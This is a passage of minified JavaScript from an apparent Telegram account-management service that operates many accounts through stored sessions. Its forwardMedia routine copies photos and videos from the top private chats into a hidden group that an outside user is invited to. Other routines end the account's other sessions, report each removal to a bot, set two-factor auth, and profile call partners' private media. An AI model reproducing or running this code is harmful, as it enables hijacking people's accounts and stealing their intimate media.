s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},a=this&&this.__importStar||function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)"default"!==i&&Object.prototype.hasOwnProperty.call(e,i)&&n(t,e,i);return o(t,e),t},s=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},c=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}},l=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.TelegramService=void 0;const p=i(9127),d=l(i(1067)),u=i(3563),m=i(6790),g=i(9155),h=a(i(6928)),y=i(9597),f=i(3235),v=i(3653),b=i(1273),w=a(i(9896)),P=i(7385),S=i(9647);let A=class{constructor(e,t,i){this.usersService=e,this.activeChannelsService=t,this.channelsService=i,this.logger=b.TelegramLogger.getInstance(),this.cleanupInterval=v.connectionManager.startCleanupInterval(),v.connectionManager.setUsersService(this.usersService)}async onModuleDestroy(){this.logger.logOperation("system","Module destroy initiated"),clearInterval(this.cleanupInterval),await v.connectionManager.disconnectAll()}getActiveClientSetup(){return d.default.getActiveClientSetup()}setActiveClientSetup(e){d.default.setActiveClientSetup(e)}async getMessages(e,t,i=8){return(await v.connectionManager.getClient(e)).getMessages(t,i)}async getMessagesNew(e,t,i,n){return(await v.connectionManager.getClient(e)).getMessagesNew(t,i,n)}async sendInlineMessage(e,t,i,n){return(await v.connectionManager.getClient(e)).sendInlineMessage(t,i,n)}async getChatId(e,t){const i=await v.connectionManager.getClient(e);return await i.getchatId(t)}async getLastActiveTime(e){const t=await v.connectionManager.getClient(e);return await t.getLastActiveTime()}async tryJoiningChannel(e,t){const i=await v.connectionManager.getClient(e);try{await i.joinChannel(t.username),console.log(i.phoneNumber," - Joined channel Success - ",t.username),t.canSendMsgs||(await this.channelsService.remove(t.channelId),await this.activeChannelsService.remove(t.channelId),console.log("Removed Channel- ",t.username))}catch(e){throw console.log(i.phoneNumber," - Failed to join - ",t.username),this.removeChannels(e,t.channelId,t.username),e}}async removeChannels(e,t,i){if("USERNAME_INVALID"==e.errorMessage||"CHAT_INVALID"==e.errorMessage||"USERS_TOO_MUCH"==e.errorMessage||e.toString().includes("No user has"))try{if(t)await this.channelsService.remove(t),await this.activeChannelsService.remove(t),console.log("Removed Channel- ",t);else{const e=(await this.channelsService.search({username:i}))[0];await this.channelsService.remove(e.channelId),await this.activeChannelsService.remove(e.channelId),console.log("Removed Channel - ",e.channelId)}}catch(e){console.log("Failed to search/remove channel: ",e)}else"CHANNEL_PRIVATE"===e.errorMessage&&(await this.channelsService.update(t,{private:!0}),await this.activeChannelsService.update(t,{private:!0}))}async getGrpMembers(e,t){try{const i=await v.connectionManager.getClient(e);return await i.getGrpMembers(t)}catch(e){console.error("Error fetching group members:",e)}}async addContact(e,t,i){try{const n=await v.connectionManager.getClient(e);return await n.addContact(t,i)}catch(e){console.error("Error fetching adding Contacts:",e)}}async addContacts(e,t,i){try{const n=await v.connectionManager.getClient(e);return await n.addContacts(t,i)}catch(e){console.error("Error fetching adding Contacts:",e)}}async getSelfMsgsInfo(e){const t=await v.connectionManager.getClient(e);return await t.getSelfMSgsInfo()}async createGroup(e){const t=await v.connectionManager.getClient(e);return await t.createGroup()}async forwardMedia(e,t,i){return(await v.connectionManager.getClient(e)).forwardMedia(t,i),setTimeout((async()=>{try{await this.leaveChannel(e,"2302868706")}catch(e){console.log("Error in forwardMedia: ",e)}}),3e5),"Media forward initiated"}async blockUser(e,t){const i=await v.connectionManager.getClient(e);return await i.blockUser(t)}async joinChannel(e,t){const i=await v.connectionManager.getClient(e);return await i.joinChannel(t)}async getCallLog(e){const t=await v.connectionManager.getClient(e);return await t.getCallLog()}async getmedia(e){const t=await v.connectionManager.getClient(e);return await t.getMediaMessages()}async getChannelInfo(e,t=!1){const i=await v.connectionManager.getClient(e);return await i.channelInfo(t)}async getMe(e){const t=await v.connectionManager.getClient(e);return await t.getMe()}async getEntity(e,t){const i=await v.connectionManager.getClient(e);return await i.getEntity(t)}async createNewSession(e){const t=await v.connectionManager.getClient(e);return await t.createNewSession()}async set2Fa(e){const t=await v.connectionManager.getClient(e);try{return await t.set2fa(),"2Fa set successfully"}catch(e){const t=(0,f.parseError)(e);throw new u.HttpException(t.message,t.status)}finally{await v.connectionManager.unregisterClient(e)}}async updatePrivacyforDeletedAccount(e){const t=await v.connectionManager.getClient(e);await t.updatePrivacyforDeletedAccount()}async deleteProfilePhotos(e){const t=await v.connectionManager.getClient(e);await t.deleteProfilePhotos()}async setProfilePic(e,t){const i=await v.connectionManager.getClient(e);await i.deleteProfilePhotos();try{await m.CloudinaryService.getInstance(t),await(0,P.sleep)(2e3);const e=process.cwd();return console.log("checking path",e),await i.updateProfilePic(h.join(e,"dp1.jpg")),await(0,P.sleep)(3e3),await i.updateProfilePic(h.join(e,"dp2.jpg")),await(0,P.sleep)(3e3),await i.updateProfilePic(h.join(e,"dp3.jpg")),await(0,P.sleep)(1e3),"Profile pic set successfully"}catch(e){const t=(0,f.parseError)(e);throw new u.HttpException(t.message,t.status)}finally{await v.connectionManager.unregisterClient(e)}}async updatePrivacy(e){const t=await v.connectionManager.getClient(e);try{return await t.updatePrivacy(),"Privacy updated successfully"}catch(e){const t=(0,f.parseError)(e);throw new u.HttpException(t.message,t.status)}}async downloadProfilePic(e,t){const i=await v.connectionManager.getClient(e);try{return await i.downloadProfilePic(t)}catch(e){throw console.log("Some Error: ",(0,f.parseError)(e),e),new Error("Failed to update username")}}async updateUsername(e,t){const i=await v.connectionManager.getClient(e);try{return await i.updateUsername(t)}catch(e){throw console.log("Some Error: ",(0,f.parseError)(e),e),new Error("Failed to update username")}}async getMediaMetadata(e,t){const i=await v.connectionManager.getClient(e);return t?await i.getAllMediaMetaData(t):await i.getMediaMetadata(t)}async downloadMediaFile(e,t,i,n){const o=await v.connectionManager.getClient(e);return await o.downloadMediaFile(t,i,n)}async forwardMessage(e,t,i,n){const o=await v.connectionManager.getClient(e);return await o.forwardMessage(t,i,n)}async leaveChannels(e){const t=await v.connectionManager.getClient(e),i=(await t.channelInfo(!1)).canSendFalseChats;return t.leaveChannels(i),"Left channels initiated"}async leaveChannel(e,t){return(await v.connectionManager.getClient(e)).leaveChannels([t]),"Left channel initiated"}async deleteChat(e,t){const i=await v.connectionManager.getClient(e);return await i.deleteChat(t)}async updateNameandBio(e,t,i){const n=await v.connectionManager.getClient(e);return await n.updateProfile(t,i)}async getDialogs(e,t){const i=await v.connectionManager.getClient(e),{limit:n=10,offsetId:o,archived:r=!1}=t,a=await i.getDialogs({limit:n,offsetId:o,archived:r}),s=[];for(const e of a){const t=await e.entity.toJSON();s.push(t)}return s}async getConnectionStatus(){const e={activeConnections:v.connectionManager.getActiveConnectionCount(),rateLimited:0,totalOperations:0};return this.logger.logOperation("system","Connection status retrieved",e),e}async forwardBulkMessages(e,t,i,n){const o=await v.connectionManager.getClient(e);return await o.forwardMessages(t,i,n)}async getAuths(e){const t=await v.connectionManager.getClient(e),i=await t.getAuths();return this.logger.logOperation(e,"Retrieved authorizations",{count:i?.length||0}),i}async removeOtherAuths(e){const t=await v.connectionManager.getClient(e);return await t.removeOtherAuths(),this.logger.logOperation(e,"Removed other authorizations"),"Removed other authorizations"}async processBatch(e,t,i,n=2e3){const o=[];let r=0;for(let a=0;a<e.length;a+=t){const s=e.slice(a,a+t);try{await i(s),r+=s.length,a+t<e.length&&await new Promise((e=>setTimeout(e,n)))}catch(e){o.push(e),this.logger.logError("batch-process","Batch processing failed",e)}}return{processed:r,errors:o}}async createGroupWithOptions(e,t){const i=await v.connectionManager.getClient(e),n=await i.createGroupWithOptions(t);return this.logger.logOperation(e,"Group created",{id:n.id?.toString()}),n}async updateGroupSettings(e,t){const i=await v.connectionManager.getClient(e);return await i.updateGroupSettings(t)}async scheduleMessage(e,t){const i=await v.connectionManager.getClient(e);return await i.scheduleMessageSend({chatId:t.chatId,message:t.message,scheduledTime:t.scheduledTime,replyTo:t.replyTo,silent:t.silent})}async getScheduledMessages(e,t){const i=await v.connectionManager.getClient(e);return await i.getScheduledMessages(t)}async sendMediaAlbum(e,t){const i=await v.connectionManager.getClient(e);return await i.sendMediaAlbum(t)}async sendVoiceMessage(e,t){const i=await v.connectionManager.getClient(e);return await i.sendVoiceMessage(t)}async cleanupChat(e,t){const i=await v.connectionManager.getClient(e);return await i.cleanupChat(t)}async getChatStatistics(e,t,i){const n=await v.connectionManager.getClient(e);return await n.getChatStatistics(t,i)}async updatePrivacyBatch(e,t){const i=await v.connectionManager.getClient(e);return await i.updatePrivacyBatch(t)}async setContentFilters(e,t){const i=await v.connectionManager.getClient(e);return await i.setContentFilters(t)}async addGroupMembers(e,t,i){const n=await v.connectionManager.getClient(e);return await n.addGroupMembers(t,i)}async removeGroupMembers(e,t,i){const n=await v.connectionManager.getClient(e);return await n.removeGroupMembers(t,i)}async promoteToAdmin(e,t,i,n,o){const r=await v.connectionManager.getClient(e);return await r.promoteToAdmin(t,i,n,o)}async demoteAdmin(e,t,i){const n=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Demoted admin to regular member",{groupId:t,userId:i}),await n.demoteAdmin(t,i)}async unblockGroupUser(e,t,i){const n=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Unblocked user in group",{groupId:t,userId:i}),await n.unblockGroupUser(t,i)}async getGroupAdmins(e,t){const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Get group admins",{groupId:t}),await i.getGroupAdmins(t)}async getGroupBannedUsers(e,t){const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Get group banned users",{groupId:t}),await i.getGroupBannedUsers(t)}async searchMessages(e,t){const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Search messages",t),await i.searchMessages(t)}async getFilteredMedia(e,t){const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Get filtered media",t),await i.getFilteredMedia(t)}async exportContacts(e,t,i=!1){const n=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Export contacts",{format:t,includeBlocked:i}),await n.exportContacts(t,i)}async importContacts(e,t){const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Import contacts",{contactCount:t.length}),await i.importContacts(t)}async manageBlockList(e,t,i){const n=await v.connectionManager.getClient(e);return this.logger.logOperation(e,i?"Block users":"Unblock users",{userIds:t}),await n.manageBlockList(t,i)}async getContactStatistics(e){const t=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Get contact statistics"),await t.getContactStatistics()}async createChatFolder(e,t){const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Create chat folder",{name:t.name}),await i.createChatFolder(t)}async getChatFolders(e){const t=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Get chat folders"),await t.getChatFolders()}async getSessionInfo(e){const t=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Get session info"),await t.getSessionInfo()}async terminateSession(e,t){const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Terminate session",t),await i.terminateSession(t)}async editMessage(e,t){const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Edit message",{chatId:t.chatId,messageId:t.messageId}),await i.editMessage(t)}async updateChatSettings(e,t){if(!t.chatId)throw new Error("chatId is required");const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Update chat settings",{chatId:t.chatId}),await i.updateChatSettings(t)}async sendMediaBatch(e,t){const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Send media batch",{chatId:t.chatId,mediaCount:t.media.length}),await i.sendMediaBatch(t)}async hasPassword(e){const t=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Check password status"),await t.hasPassword()}async getContacts(e){const t=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Get contacts list"),await t.getContacts()}async getChats(e,t){const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Get chats",t),await i.getChats(t)}async getFileUrl(e,t,i){const n=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Get file URL",{url:t,filename:i}),await n.getFileUrl(t,i)}async getMessageStats(e,t){const i=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Get message statistics",t),await i.getMessageStats(t)}async sendViewOnceMedia(e,t){const i=await v.connectionManager.getClient(e);this.logger.logOperation(e,"Send view once media",{sourceType:t.sourceType,chatId:t.chatId});const{sourceType:n,chatId:o,caption:r,filename:a}=t;try{if("path"!==n){if("base64"===n){if(!t.base64Data)throw new u.BadRequestException("Base64 data is required when sourceType is base64");const n=t.base64Data;let s=!1;if(a){const e=a.toLowerCase().split(".").pop();e&&["mp4","mov","avi","mkv","wmv","flv","webm","3gp"].includes(e)&&(s=!0)}this.logger.logOperation(e,"Sending view once media from base64",{isVideo:s,size:n.length});const c=Buffer.from(n,"base64");return await i.sendViewOnceMedia(o,c,r,s,a)}if("binary"===n){if(!t.binaryData)throw new u.BadRequestException("Binary data is required when sourceType is binary");this.logger.logOperation(e,"Sending view once media from binary",{size:t.binaryData.length,filename:a||"unknown"});let n=!1;if(a){const e=a.toLowerCase().split(".").pop();e&&["mp4","mov","avi","mkv","wmv","flv","webm","3gp"].includes(e)&&(n=!0)}return await i.sendViewOnceMedia(o,t.binaryData,r,n,a)}throw new u.BadRequestException("Invalid source type. Must be one of: url, base64, binary")}if(!t.path)throw new u.BadRequestException("Path is required when sourceType is url");try{const n=t.path;if(!w.existsSync(n))throw new u.BadRequestException(`File not found at path: ${n}`);let s=!1;const c=h.extname(n).toLowerCase().substring(1);["mp4","mov","avi","mkv","wmv","flv","webm","3gp"].includes(c)&&(s=!0);const l=w.readFileSync(n);return this.logger.logOperation(e,"Sending view once media from local file",{path:n,isVideo:s,size:l.length,filename:a||h.basename(n)}),await i.sendViewOnceMedia(o,l,r,s,a||h.basename(n))}catch(t){if(t instanceof u.BadRequestException)throw t;throw this.logger.logError(e,"Failed to read local file",t),new u.BadRequestException(`Failed to read local file: ${t.message}`)}}catch(t){throw this.logger.logError(e,"Failed to send view once media",t),t}}async getTopPrivateChats(e){const t=await v.connectionManager.getClient(e);return this.logger.logOperation(e,"Get top private chats"),await t.getTopPrivateChats()}async addBotsToChannel(e,t=[process.env.accountsChannel,process.env.updatesChannel,process.env.notifChannel,"miscmessages",process.env.httpFailuresChannel]){this.logger.logOperation(e,"Add bots to channel",{channelIds:t});const i=(process.env.BOT_TOKENS||"").split(",").filter(Boolean);if(0===i.length)throw new Error("No bot tokens configured. Please set BOT_TOKENS environment variable");for(const n of i)try{const i=await this.getBotInfo(n);if(i)for(const n of t)await this.setupBotInChannel(e,n,i.id,i.username,{changeInfo:!0,postMessages:!0,editMessages:!0,deleteMessages:!0,banUsers:!0,inviteUsers:!0,pinMessages:!0,addAdmins:!0,anonymous:!1,manageCall:!1})}catch(t){this.logger.logError(e,"Failed to setup bot in channel",t)}}async getBotInfo(e){try{const t=await(0,S.fetchWithTimeout)(`https://api.telegram.org/bot${e}/getMe`);if(t.data?.ok)return t.data.result;throw new Error("Failed to get bot info")}catch(e){throw new Error(`Failed to get bot info: ${e.message}`)}}async setupBotInChannel(e,t,i,n,o){const r=await v.connectionManager.getClient(e);this.logger.logOperation(e,"Setup bot in channel",{channelId:t,botId:i,botUsername:n});try{await r.joinChannel(t)}catch(t){this.logger.logError(e,"Failed to join channel",t)}try{await r.addGroupMembers(t,[n]),this.logger.logOperation(e,"Bot added to channel",{channelId:t,botUsername:n}),await(0,P.sleep)(2e3),this.logger.logOperation(e,`Bot ${n} successfully added to channel ${t}`)}catch(i){this.logger.logError(e,`Failed to add bot ${n} to channel ${t}`,i)}try{await r.promoteToAdmin(t,n,o),console.log(`Bot ${n} promoted as admin in channel ${t}`)}catch(i){this.logger.logError(e,`Failed to setup bot ${n} in channel ${t}`,i)}}};t.TelegramService=A,t.TelegramService=A=r([(0,u.Injectable)(),c(0,(0,u.Inject)((0,u.forwardRef)((()=>p.UsersService)))),c(1,(0,u.Inject)((0,u.forwardRef)((()=>g.ActiveChannelsService)))),c(2,(0,u.Inject)((0,u.forwardRef)((()=>y.ChannelsService)))),s("design:paramtypes",[p.UsersService,g.ActiveChannelsService,y.ChannelsService])],A)},1067:function(e,t,i){var n=this&&this.__createBinding||(Object.create?function(e,t,i,n){void 0===n&&(n=i);var o=Object.getOwnPropertyDescriptor(t,i);o&&!("get"in o?!t.__esModule:o.writable||o.configurable)||(o={enumerable:!0,get:function(){return t[i]}}),Object.defineProperty(e,n,o)}:function(e,t,i,n){void 0===n&&(n=i),e[n]=t[i]}),o=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),r=this&&this.__importStar||function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)"default"!==i&&Object.prototype.hasOwnProperty.call(e,i)&&n(t,e,i);return o(t,e),t},a=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0});const s=i(3047),c=i(689),l=i(6969),p=a(i(8938)),d=r(i(9896)),u=i(8178),m=i(7385),g=i(5651),h=i(8383),y=a(i(2041)),f=i(6185),v=i(3235),b=i(9647),w=i(6250),P=i(3653);class S{constructor(e,t){this.session=new c.StringSession(e),this.phoneNumber=t,this.client=null,this.channelArray=[],this.contentFilters=new Map}static getActiveClientSetup(){return S.activeClientSetup}static setActiveClientSetup(e){S.activeClientSetup=e}async createGroup(){const e="Saved Messages",t=this.phoneNumber;console.log("Creating group:",e);const i=await this.client.invoke(new s.Api.channels.CreateChannel({title:e,about:t,megagroup:!0,forImport:!0})),{id:n,accessHash:o}=i.chats[0];console.log("Archived chat",n),await this.archiveChat(n,o);const r=["fuckyoubabie"];console.log("Adding users to the channel:",r);const a=await this.client.invoke(new s.Api.channels.InviteToChannel({channel:new s.Api.InputChannel({channelId:n,accessHash:o}),users:r}));return console.log("Successful addition of users:",a),{id:n,accessHash:o}}async archiveChat(e,t){return console.log("Archiving chat",e),await this.client.invoke(new s.Api.folders.EditPeerFolders({folderPeers:[new s.Api.InputFolderPeer({peer:new s.Api.InputPeerChannel({channelId:e,accessHash:t}),folderId:1})]}))}async createOrJoinChannel(e){let t,i;if(e){const n=await this.joinChannel(e);t=n.chats[0].id,i=n.chats[0].accessHash,await this.archiveChat(t,i),console.log("Archived chat",t)}else{const e=await this.createGroup();t=e.id,i=e.accessHash,console.log("Created new group with ID:",t)}return{id:t,accesshash:i}}async forwardMedia(e,t){let i;try{let n;if(console.log("Forwarding media from chat to channel",e,t),t){const o=await this.createOrJoinChannel(e);i=o.id,n=o.accesshash,await this.forwardSecretMsgs(t,i.toString())}else{const t=await this.getTopPrivateChats(),o=await this.getMe();if(t.length>0){const r=await this.createOrJoinChannel(e);i=r.id,n=r.accesshash;const a=new Set(t.map((e=>e.chatId)));a.add(o.id.toString());for(const e of a){const t=await this.searchMessages({chatId:e,limit:1e3,types:["photo","video"]});console.log("Forwarding messages from chat:",e,"to channel:",i),await this.forwardMessages(e,i,t.photo.messages),await this.forwardMessages(e,i,t.video.messages)}}console.log("Completed forwarding messages from top private chats to channel:",i)}}catch(e){console.log(e)}await this.leaveChannels([i.toString()]),await P.connectionManager.unregisterClient(this.phoneNumber)}async forwardSecretMsgs(e,t){let i=0,n=0,o=0,r=[];do{r=await this.client.getMessages(e,{offsetId:i,limit:100}),n=r.total;const a=r.map((e=>{if(i=e.id,e.id&&e.media)return e.id})).filter((e=>void 0!==e));if(console.log(a),a.length>0){try{await this.client.forwardMessages(t,{messages:a,fromPeer:e}),o+=a.length,console.log(`Forwarded ${o} / ${n} messages`),await(0,m.sleep)(5e3)}catch(e){console.error("Error occurred while forwarding messages:",e)}await(0,m.sleep)(5e3)}}while(r.length>0);console.log("Left the channel with ID:",t)}async forwardMessages(e,t,i){const n=i.length;let o=0;for(let r=0;r<n;r+=30){const a=i.slice(r,r+30);try{await this.client.forwardMessages(t,{messages:a,fromPeer:e}),o+=a.length,console.log(`Forwarded ${o} / ${n} messages`),await(0,m.sleep)(5e3)}catch(e){console.error("Error occurred while forwarding messages:",e)}}return o}async disconnect(){if(this.client)try{console.log("Destroying Client: ",this.phoneNumber),await this.cleanupClient(),console.log("Client Destroyed finally: ",this.phoneNumber)}catch(e){throw console.error("Error during disconnect:",e),e}}async cleanupClient(){try{if(!this.client)return;const e=this.client.listEventHandlers();for(const t of e)this.client.removeEventHandler(t[1],t[0]);console.debug("Removing all handlers");try{this.client.connected&&await this.client.disconnect(),await this.client.destroy(),console.debug("Client destroyed")}catch(e){(0,v.parseError)(e,`${this.phoneNumber}: Error during client cleanup`)}await this.client.destroy(),await this.client.disconnect(),this.client=null,this.session.delete(),this.channelArray=[],this.client=null,await(0,m.sleep)(2e3),console.log("Client Destroyed: ",this.phoneNumber)}catch(e){(0,v.parseError)(e,`${this.phoneNumber}: Error during client cleanup`)}}async getchatId(e){if(!this.client)throw new Error("Client is not initialized");return await this.client.getInputEntity(e)}async getMe(){return await this.client.getMe()}async errorHandler(e){(0,v.parseError)(e),e.message&&"TIMEOUT"==e.message||console.error(`Error occurred for API ID ${this.phoneNumber}:`,e)}async createClient(e=!0,t){this.client=new s.TelegramClient(this.session,parseInt(process.env.API_ID),process.env.API_HASH,{connectionRetries:5}),this.client.setLogLevel(g.LogLevel.ERROR),await this.client.connect();const i=await this.client.getMe();return console.log("Connected Client : ",i.phone),e&&this.client&&(console.log("Adding event Handler"),t?this.client.addEventHandler((async e=>{await t(e)}),new l.NewMessage):this.client.addEventHandler((async e=>{await this.handleEvents(e)}),new l.NewMessage)),this.client}async getGrpMembers(e){try{const t=[],i=await this.client.getEntity(e);if(!(i instanceof s.Api.Chat||i instanceof s.Api.Channel))return void console.log("Invalid group or channel!");console.log(`Fetching members of ${i.title||i.username}...`);const n=await this.client.invoke(new s.Api.channels.GetParticipants({channel:i,filter:new s.Api.ChannelParticipantsRecent,offset:0,limit:200,hash:(0,y.default)(0)}));if(n instanceof s.Api.channels.ChannelParticipants){const e=n.participants;console.log(`Members: ${e.length}`);for(const i of e){const e=i instanceof s.Api.ChannelParticipant?i.userId:null;if(e){const i=await this.client.getEntity(e);t.push({tgId:i.id,name:`${i.firstName||""} ${i.lastName||""}`,username:`${i.username||""}`}),"Deleted Account"!=i.firstName||i.username||console.log(JSON.stringify(i.id))}else console.log(JSON.stringify(i?.userId))}}else console.log("No members found or invalid group.");return console.log(t.length),t}catch(e){console.error("Error fetching group members:",e)}}async getMessages(e,t=8){return await this.client.getMessages(e,{limit:t})}async getDialogs(e){const t=await this.client.getDialogs(e);return console.log("TotalChats:",t.total),t}async getLastMsgs(e){if(!this.client)throw new Error("Client is not initialized");const t=await this.client.getMessages("777000",{limit:e});let i="";return t.forEach((e=>{console.log(e.text),i+=e.text+"\n"})),i}async getSelfMSgsInfo(){if(!this.client)throw new Error("Client is not initialized");const e=(await this.client.getMe()).id;let t=0,i=0,n=0,o=0,r=0,a=0,s=0;const c=await this.client.getMessages(e,{limit:200});for(const e of c){const c=e.text.toLocaleLowerCase();(0,f.contains)(c,["movie","series","1080","720","terabox","640","title","aac","265","264","instagr","hdrip","mkv","hq","480","blura","s0","se0","uncut"])?s++:e.photo?(t++,e.fwdFrom?o++:i++):e.video&&(a++,e.fwdFrom?r++:n++)}return{total:c.total,photoCount:t,videoCount:a,movieCount:s,ownPhotoCount:i,otherPhotoCount:o,ownVideoCount:n,otherVideoCount:r}}async channelInfo(e=!1){if(!this.client)throw new Error("Client is not initialized");const t=await this.client.getDialogs({limit:1500});let i=0,n=0,o=0;this.channelArray.length=0;const r=[];console.log("TotalChats:",t.total);for(const e of t)if(e.isChannel||e.isGroup)try{const t=e.entity.toJSON(),{broadcast:a,defaultBannedRights:s,id:c}=t;o++,a||s?.sendMessages?(n++,r.push(c.toString()?.replace(/^-100/,""))):(i++,this.channelArray.push(c.toString()?.replace(/^-100/,"")))}catch(e){(0,v.parseError)(e)}return{chatsArrayLength:o,canSendTrueCount:i,canSendFalseCount:n,ids:e?this.channelArray:[],canSendFalseChats:r}}async addContact(e,t){try{for(let i=0;i<e.length;i++){const n=e[i],o=`${t}${i+1}`,r="";try{await this.client.invoke(new s.Api.contacts.AddContact({firstName:o,lastName:r,phone:n.mobile,id:n.tgId}))}catch(e){console.log(e)}}}catch(e){console.error("Error adding contacts:",e),(0,v.parseError)(e,"Failed to save contacts")}}async addContacts(e,t){try{const i=[];for(let n=0;n<e.length;n++){const o=e[n],r=`${t}${n+1}`,a="",c=(0,y.default)((n<<16).toString(10));i.push(new s.Api.InputPhoneContact({clientId:c,phone:o,firstName:r,lastName:a}))}const n=await this.client.invoke(new s.Api.contacts.ImportContacts({contacts:i}));console.log("Imported Contacts Result:",n)}catch(e){console.error("Error adding contacts:",e),(0,v.parseError)(e,"Failed to save contacts")}}async leaveChannels(e){console.log("Leaving Channels: initaied!!"),console.log("ChatsLength: ",e);for(const t of e)try{const i=t.startsWith("-100")?t:`-100${t}`;await this.client.invoke(new s.Api.channels.LeaveChannel({channel:i})),console.log(`${this.phoneNumber} Left channel :`,t),e.length>1&&await(0,m.sleep)(3e3)}catch(e){const t=(0,v.parseError)(e);console.log(`${this.phoneNumber} Failed to leave channel :`,t.message);break}console.log(`${this.phoneNumber} Leaving Channels: Completed!!`)}async getEntity(e){return await(this.client?.getEntity(e))}async joinChannel(e){return console.log("trying to join channel : ",e),await(this.client?.invoke(new s.Api.channels.JoinChannel({channel:await(this.client?.getEntity(e))})))}connected(){return this.client.connected}async connect(){return await this.client.connect()}async removeOtherAuths(){if(!this.client)throw new Error("Client is not initialized");const e=await this.client.invoke(new s.Api.account.GetAuthorizations);for(const t of e.authorizations)this.isAuthMine(t)||(await(0,b.fetchWithTimeout)(`${(0,w.notifbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${t.appName}:${t.country}:${t.deviceModel}`)}`),await this.resetAuthorization(t))}isAuthMine(e){return[{field:"country",value:"singapore"},{field:"deviceModel",values:["oneplus 11","cli","linux","windows"]},{field:"appName",values:["likki","rams","sru","shru","hanslnz"]}].some((t=>"values"in t?t.values.some((i=>e[t.field].toLowerCase().includes(i.toLowerCase()))):e[t.field].toLowerCase().includes(t.value.toLowerCase())))}async resetAuthorization(e){await(this.client?.invoke(new s.Api.account.ResetAuthorization({hash:e.hash})))}async getAuths(){if(!this.client)throw new Error("Client is not initialized");return await this.client.invoke(new s.Api.account.GetAuthorizations)}async getAllChats(){if(!this.client)throw new Error("Client is not initialized");const e=await this.client.getDialogs({limit:500});console.log("TotalChats:",e.total);const t=[];for(const i of e){const e=await i.entity.toJSON();t.push(e)}return t}async getMessagesNew(e,t=0,i=20){const n=await this.client.getMessages(e,{offsetId:t,limit:i});return await Promise.all(n.map((async e=>{const t=e.media?{type:e.media.className.includes("video")?"video":"photo",thumbnailUrl:await this.getMediaUrl(e)}:null;return{id:e.id,message:e.message,date:e.date,sender:{id:e.senderId?.toString(),is_self:e.out,username:e.fromId?e.fromId.toString():null},media:t}})))}async getMediaUrl(e){if(e.media instanceof s.Api.MessageMediaPhoto){console.log("messageId image:",e.id);const t=e.photo?.sizes||[1];return await this.client.downloadMedia(e,{thumb:t[1]?t[1]:t[0]})}if(e.media instanceof s.Api.MessageMediaDocument&&(e.document?.mimeType?.startsWith("video")||e.document?.mimeType?.startsWith("image"))){console.log("messageId video:",e.id);const t=e.document?.thumbs||[1];return await this.client.downloadMedia(e,{thumb:t[1]?t[1]:t[0]})}return null}async sendInlineMessage(e,t,i){const n={text:"Open URL",url:i};return await this.client.sendMessage(e,{message:t,buttons:[new s.Api.KeyboardButtonUrl(n)]})}async getMediaMessages(){return await this.client.invoke(new s.Api.messages.Search({peer:new s.Api.InputPeerEmpty,q:"",filter:new s.Api.InputMessagesFilterPhotos,minDate:0,maxDate:0,offsetId:0,addOffset:0,limit:200,maxId:0,minId:0,hash:(0,y.default)(0)}))}async getCallLog(){const e=(await this.client.invoke(new s.Api.messages.Search({peer:new s.Api.InputPeerEmpty,q:"",filter:new s.Api.InputMessagesFilterPhoneCalls({}),minDate:0,maxDate:0,offsetId:0,addOffset:0,limit:200,maxId:0,minId:0,hash:(0,y.default)(0)}))).messages.filter((e=>e.action instanceof s.Api.MessageActionPhoneCall)),t={outgoing:0,incoming:0,video:0,chatCallCounts:{},totalCalls:0};for(const i of e){t.totalCalls++;const e=i.action;i.out?t.outgoing++:t.incoming++,e.video&&t.video++;const n=i.peerId.userId.toString();if(!t.chatCallCounts[n]){const e=await this.client.getEntity(n);t.chatCallCounts[n]={phone:e.phone,username:e.username,name:`${e.firstName}  ${e.lastName?e.lastName:""}`,count:0}}t.chatCallCounts[n].count++}const i=[];for(const[e,n]of Object.entries(t.chatCallCounts))if(n.count>4){let t=0,o=0;const r=await this.client.getMessages(e,{limit:600});for(const e of r){const i=e.text.toLocaleLowerCase();(0,f.contains)(i,["movie","series","1080","720","terabox","640","title","aac","265","264","instagr","hdrip","mkv","hq","480","blura","s0","se0","uncut"])||(e.media instanceof s.Api.MessageMediaPhoto?o++:e.media instanceof s.Api.MessageMediaDocument&&(e.document?.mimeType?.startsWith("video")||e.document?.mimeType?.startsWith("image"))&&t++)}i.push({...n,msgs:r.total,video:t,photo:o,chatId:e})}return console.log({...t,chatCallCounts:i}),{...t,chatCallCounts:i}}async getCallLogsInternal(){const e={},t=(await this.client.invoke(new s.Api.messages.Search({peer:new s.Api.InputPeerEmpty,q:"",filter:new 